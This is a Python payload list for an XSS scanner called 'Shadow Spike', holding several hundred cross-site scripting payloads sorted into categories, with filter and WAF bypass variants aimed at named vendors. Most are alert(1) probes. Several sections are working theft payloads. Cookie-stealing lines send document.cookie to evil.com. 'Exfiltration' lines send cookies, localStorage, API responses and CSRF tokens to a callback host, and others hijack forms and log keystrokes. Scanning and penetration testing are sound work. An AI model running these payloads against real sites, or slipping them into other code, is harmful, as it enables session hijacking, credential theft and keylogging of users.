"""
XSS Payload Database - Shadow Spike XSS Scanner
Comprehensive list of XSS payloads covering all known categories.
"""
from typing import List

XSS_PAYLOADS: List[str] = [
    # ─────────────────────────────────────────
    # BASIC SCRIPT TAGS
    # ─────────────────────────────────────────
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<Script>alert(1)</Script>",
    "<script >alert(1)</script>",
    "<script\t>alert(1)</script>",
    "<script\n>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(/XSS/)</script>",
    "<script>{alert(1)}</script>",
    "<script>/* comment */alert(1)</script>",
    "<script language=javascript>alert(1)</script>",
    "<script type=text/javascript>alert(1)</script>",
    "<script type='text/javascript'>alert(1)</script>",
    "<script src=//evil.com/xss.js></script>",
    "<script>throw alert(1)</script>",
    "<script>void(alert(1))</script>",
    "<script>alert.call(this,1)</script>",
    "<script>alert.apply(this,[1])</script>",
    "<script>[].find.call([1],alert)</script>",
    "<script>requestAnimationFrame(alert)</script>",
    "<script>window['alert'](1)</script>",
    "<script>window[atob('YWxlcnQ=')](1)</script>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',0)</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>new Function('alert(1)')()</script>",
    "<script>(()=>alert(1))()</script>",
    "<script>!function(){alert(1)}()</script>",
    "<script>;alert(1);</script>",

    # ─────────────────────────────────────────
    # EVENT HANDLERS - IMG
    # ─────────────────────────────────────────
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=1 onerror=alert(1)>",
    "<img src onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    '<img src=x onerror="alert(1)">',
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img src=x oNErRoR=alert(1)>",
    '<img src=x onerror=alert(1) />',
    "<img src=javascript:alert(1)>",
    "<img dynsrc=javascript:alert(1)>",
    "<img lowsrc=javascript:alert(1)>",
    "<img src=x onerror=window.alert(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=this.onerror=alert;throw 1>",
    "<img src=x onerror=setTimeout(alert,0,1)>",
    "<img src=x onerror=setInterval(alert,0,1)>",
    "<img src=x onerror=Function('alert(1)')()>",
    "<img src=x onerror=(()=>alert(1))()>",
    "<img src=x onerror=document.write('<script>alert(1)<\\/script>')>",

    # ─────────────────────────────────────────
    # EVENT HANDLERS - BODY / HTML
    # ─────────────────────────────────────────
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1)>",
    "<body onerror=alert(1)>",
    "<body onhashchange=alert(1)><a href=#x>click",
    "<body onresize=alert(1) style=display:block>",
    "<body onscroll=alert(1)><div style=height:1000px>",
    "<body onmessage=alert(1)>",
    "<html onmousemove=alert(1)>",

    # ─────────────────────────────────────────
    # EVENT HANDLERS - INPUT / FORM
    # ─────────────────────────────────────────
    "<input autofocus onfocus=alert(1)>",
    "<input onmouseover=alert(1)>",
    "<input type=image src=x onerror=alert(1)>",
    "<input type=text onkeydown=alert(1)>",
    "<input type=text onkeyup=alert(1)>",
    "<input type=text onkeypress=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<form onsubmit=alert(1)><input type=submit>",
    "<form oninput=alert(1)><input>",
    "<textarea onfocus=alert(1) autofocus></textarea>",
    "<select autofocus onfocus=alert(1)></select>",
    "<button onclick=alert(1)>click</button>",
    "<button onmouseover=alert(1)>hover</button>",

    # ─────────────────────────────────────────
    # EVENT HANDLERS - ANCHOR / LINK
    # ─────────────────────────────────────────
    "<a href=javascript:alert(1)>click</a>",
    "<a href=javascript:alert(document.cookie)>click</a>",
    "<a onmouseover=alert(1)>hover</a>",
    "<a onclick=alert(1)>click</a>",
    "<a href=# onclick=alert(1)>click</a>",
    "<a/href=javascript:alert(1)>click</a>",

    # ─────────────────────────────────────────
    # SVG BASED
    # ─────────────────────────────────────────
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x></svg>",
    "<svg><set onbegin=alert(1) attributeName=x></svg>",
    "<svg><image href=x onerror=alert(1)></svg>",
    "<svg onload=alert(1) style=display:block>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    "<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>",
    "<svg id=alert(1) onload=eval(id)>",
    "<svg><script href=data:,alert(1) />",
    "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=1000 height=1000 /></a></svg>",

    # ─────────────────────────────────────────
    # VIDEO / AUDIO / MEDIA
    # ─────────────────────────────────────────
    "<video src=x onerror=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<video autoplay onplay=alert(1)><source src=x>",
    "<audio src=x onerror=alert(1)>",
    "<audio autoplay onplay=alert(1)><source src=x type=audio/mpeg>",
    "<source src=x onerror=alert(1)>",

    # ─────────────────────────────────────────
    # DETAILS / SUMMARY / MISC HTML5
    # ─────────────────────────────────────────
    "<details open ontoggle=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<marquee loop=1 width=0 onfinish=alert(1)>",
    "<math><mtext></p><img src=1 onerror=alert(1)></math>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<div onmouseenter=alert(1)>hover</div>",
    "<div onclick=alert(1)>click</div>",
    "<div ondblclick=alert(1)>dblclick</div>",
    "<div oncontextmenu=alert(1)>right click</div>",
    "<div onwheel=alert(1)>scroll</div>",
    "<div contenteditable oncut=alert(1)>cut me</div>",
    "<div contenteditable oncopy=alert(1)>copy me</div>",
    "<div contenteditable onpaste=alert(1)>paste here</div>",
    "<div ondragenter=alert(1) contenteditable draggable=true>drag</div>",
    "<p onmouseover=alert(1)>hover</p>",
    "<br/onmouseover=alert(1)>",
    "<hr/onmouseover=alert(1)>",

    # ─────────────────────────────────────────
    # IFRAME / OBJECT / EMBED
    # ─────────────────────────────────────────
    "<iframe src=javascript:alert(1)>",
    "<iframe onload=alert(1)>",
    "<iframe src=data:text/html,<script>alert(1)</script>>",
    "<iframe srcdoc=<script>alert(1)</script>>",
    "<object data=javascript:alert(1)>",
    "<object data=data:text/html,<script>alert(1)</script>>",
    "<embed src=javascript:alert(1)>",
    "<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",

    # ─────────────────────────────────────────
    # META / LINK / BASE
    # ─────────────────────────────────────────
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    '<meta http-equiv=refresh content="0;javascript:alert(1)">',
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    "<base href=javascript:alert(1)//>",

    # ─────────────────────────────────────────
    # ATTRIBUTE BREAKOUT
    # ─────────────────────────────────────────
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '" onerror=alert(1) "',
    "' onerror=alert(1) '",
    '" autofocus onfocus=alert(1) "',
    "' autofocus onfocus=alert(1) '",
    '"><body onload=alert(1)>',
    '" onmouseover=alert(1) x="',
    '"onmouseover=alert(1)//',
    "javascript:alert(1)//",
    '" href=javascript:alert(1) "',
    "'><a href=javascript:alert(1)>click</a>",
    "-alert(1)-",
    "};alert(1)//",
    "'; alert(1) //",
    '"; alert(1) //',
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</noscript><script>alert(1)</script>",
    "</template><script>alert(1)</script>",

    # ─────────────────────────────────────────
    # JAVASCRIPT URI SCHEMES
    # ─────────────────────────────────────────
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "javascript:alert(document.cookie)",
    "JAVASCRIPT:alert(1)",
    "Javascript:alert(1)",
    "javascript&#58;alert(1)",
    "javascript&#x3A;alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\rscript:alert(1)",
    "javascript:void(alert(1))",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:alert(1)",

    # ─────────────────────────────────────────
    # HTML ENTITY ENCODED
    # ─────────────────────────────────────────
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",

    # ─────────────────────────────────────────
    # URL ENCODED
    # ─────────────────────────────────────────
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg+src=x+onerror=alert(1)%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%27%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "%253Cimg+src=x+onerror=alert(1)%253E",

    # ─────────────────────────────────────────
    # UNICODE ENCODED
    # ─────────────────────────────────────────
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",

    # ─────────────────────────────────────────
    # FILTER BYPASS - CASE MIXING
    # ─────────────────────────────────────────
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<ImG sRc=x OnErRoR=alert(1)>",
    "<SVG ONLOAD=alert(1)>",

    # ─────────────────────────────────────────
    # FILTER BYPASS - EXTRA CHARS
    # ─────────────────────────────────────────
    "<img/src=x/onerror=alert(1)>",
    "<svg\tonload=alert(1)>",
    "<img src=x\tonerror=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)</script>",
    "<script/alert(1)>",
    "<script>/**/alert(1)</script>",
    "<script>alert/**/( 1)</script>",

    # ─────────────────────────────────────────
    # DOM-BASED
    # ─────────────────────────────────────────
    "#<img src=x onerror=alert(1)>",
    "#<script>alert(1)</script>",
    "#javascript:alert(1)",

    # ─────────────────────────────────────────
    # ANGULARJS / TEMPLATE INJECTION
    # ─────────────────────────────────────────
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{alert(1)}}",
    "{{7*7}}",
    "{{$eval.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    "<%= alert(1) %>",
    "[[alert(1)]]",
    "{alert(1)}",
    "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
    "{{['alert'](1)}}",
    "{{[].join.call([1],alert)}}",

    # ─────────────────────────────────────────
    # POLYGLOT XSS
    # ─────────────────────────────────────────
    "\" onclick=alert(1)//<button '",
    "\" onclick=alert(1)// -->",
    "<script/src=data:,alert(1)>",
    "<!--<img src=--><img src=x onerror=alert(1)>-->",
    "<comment><img src=</comment><img src=x onerror=alert(1)>",
    "<![CDATA[<script>alert(1)</script>]]>",

    # ─────────────────────────────────────────
    # WAF BYPASS - ENCODING
    # ─────────────────────────────────────────
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=Function('ale'+'rt(1)')()>",
    "<script>window['ale'+'rt'](1)</script>",
    "<script>window[atob('YWxlcnQ=')](1)</script>",
    '<a href="\\x01javascript:alert(1)">click</a>',
    '<a href=" javascript:alert(1)">click</a>',
    '<a href="jAvAsCrIpT:alert(1)">click</a>',
    "<script>alert(String.fromCharCode(49))</script>",
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",

    # ─────────────────────────────────────────
    # WAF BYPASS - COMMENT TRICKS
    # ─────────────────────────────────────────
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    "<img src=x o<!---->nerror=alert(1)>",
    "<!-/-><img src=x onerror=alert(1)>",

    # ─────────────────────────────────────────
    # MUTATION XSS (mXSS)
    # ─────────────────────────────────────────
    "<listing><img src=x onerror=alert(1)></listing>",
    "<noscript><p title=\"></noscript><img src=x onerror=alert(1)>",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<plaintext><img src=x onerror=alert(1)>",

    # ─────────────────────────────────────────
    # CSS INJECTION
    # ─────────────────────────────────────────
    '<div style="background:url(\'javascript:alert(1)\')"></div>',
    "<style>*{background:url('javascript:alert(1)')}</style>",
    '<div style="width:expression(alert(1))"></div>',
    '<img style="xss:expression(alert(1))">',

    # ─────────────────────────────────────────
    # COOKIE STEALING PAYLOADS
    # ─────────────────────────────────────────
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<img src=x onerror=document.location='http://evil.com/?c='+document.cookie>",
    "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
    "<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/?c='+document.cookie);x.send();</script>",

    # ─────────────────────────────────────────
    # SPECIAL CONTEXT & EXFILTRATION PAYLOADS
    # ─────────────────────────────────────────
    "<script>alert(window.location)</script>",
    "<script>alert(navigator.userAgent)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(localStorage.getItem('token'))</script>",
    "<script>alert(sessionStorage.getItem('session_id'))</script>",
    
    # Advanced Data Stealing (Exfiltration)
    "<script>fetch('http://shadow-spike-callback.local/log?cookie='+btoa(document.cookie))</script>",
    "<script>new Image().src='http://shadow-spike-callback.local/log?localStorage='+btoa(JSON.stringify(localStorage))</script>",
    "<script>navigator.sendBeacon('http://shadow-spike-callback.local/log', document.cookie)</script>",
    "<script>fetch('/api/user').then(r=>r.text()).then(d=>fetch('http://shadow-spike-callback.local/log?data='+btoa(d)))</script>",
    "<img src=x onerror=\"window.location='http://shadow-spike-callback.local/?c='+document.cookie\">",
    "<script>document.body.innerHTML+='<img src=\"http://shadow-spike-callback.local/log?c='+document.cookie+'\">'</script>",
    
    # Form Hijacking / CSRF Token Stealing
    "<script>var t=document.querySelector('input[name=\"csrf\"]').value;fetch('http://shadow-spike-callback.local/log?csrf='+t)</script>",
    "<script>document.forms[0].action='http://shadow-spike-callback.local/steal';document.forms[0].submit()</script>",
    "<script>window.addEventListener('keypress',function(e){fetch('http://shadow-spike-callback.local/keylog?k='+e.key)})</script>",

    # ─────────────────────────────────────────
    # XML / JSON CONTEXT
    # ─────────────────────────────────────────
    "<![CDATA[<script>alert(1)</script>]]>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

    # ─────────────────────────────────────────
    # OBJECT / TABLE
    # ─────────────────────────────────────────
    "<table background=javascript:alert(1)>",
    "<td background=javascript:alert(1)>",
    "<th background=javascript:alert(1)>",

    # ─────────────────────────────────────────
    # GOD MODE POLYGLOTS (Bypass Multiple Contexts)
    # ─────────────────────────────────────────
    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\">><script>alert(1)</script><\"",
    "javascript://%250Aalert(1)//\"onclick=alert(1)//<svg/onload=alert(1)>",
    "\">><marquee><img src=x onerror=confirm(1)></marquee>\"</plaintext\\></|\\><plaintext/onmouseover=prompt(1)<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\"</script><script>alert(1)</script>\">",
    "1/\"onmouseover=alert(1)><svg/onload=alert(1)>\"\"/>",
    "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    
    # ─────────────────────────────────────────
    # JSFUCK / NON-ALPHANUMERIC WAF BYPASS
    # ─────────────────────────────────────────
    "[]+(+[])[+[]]",
    "([][[]]+[])[+!![]]+([]+{})[!+[]+!![]]",
    "_=~[];={_='<'+_+'><'+_+'>';_=_;}(_);alert(1)",
    "(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]",
    "(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!![]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!![]+!![]]+(!![]+[])[+!+[]]]+[])[!+[]+!![]+!![]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!![]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!![]+!![]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!![]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!![]+!![]]+(!![]+[])[+!+[]]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!![]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!![]+!![]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!![]]]",

    # ─────────────────────────────────────────
    # DOUBLE / TRIPLE ENCODED BYPASS
    # ─────────────────────────────────────────
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E",
    "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
    "%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert(1)%25253E",
    "&#37;&#51;&#67;&#115;&#99;&#114;&#105;&#112;&#116;&#37;&#51;&#69;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#37;&#51;&#67;&#37;&#50;&#70;&#115;&#99;&#114;&#105;&#112;&#116;&#37;&#51;&#69;",

    # ─────────────────────────────────────────
    # CLOUDFLARE / IMPERVA / AKAMAI BYPASS
    # ─────────────────────────────────────────
    "<a href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;\">",
    "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
    "<svg/onload=setTimeout(1,alert(1))>",
    "<svg/onload=setInterval(1,alert(1))>",
    "<iframe/onload=Function`al\\ert\\(1\\)`()>",
    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;\">",
    "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
    "<xmp><p title=\"</xmp><svg/onload=alert(1)>\">",
    "<math><a xlink:href=//jsfiddle.net/1>click",
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><script>alert&lpar;1&rpar;</script>",
    "<form><button formaction=javascript&colon;alert(1)>CLICKME</button>",
    "<input/onmouseover=\"javaSCRIPT&colon;alert(1)\">",
    "<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />",
    
    # ─────────────────────────────────────────
    # REACT / VUE / JS FRAMEWORK BYPASS
    # ─────────────────────────────────────────
    "javascript:alert(1)//",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://evil.com/xss.js\\';document.body.appendChild(a)')",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
]

# Total payload count
PAYLOAD_COUNT = len(XSS_PAYLOADS)
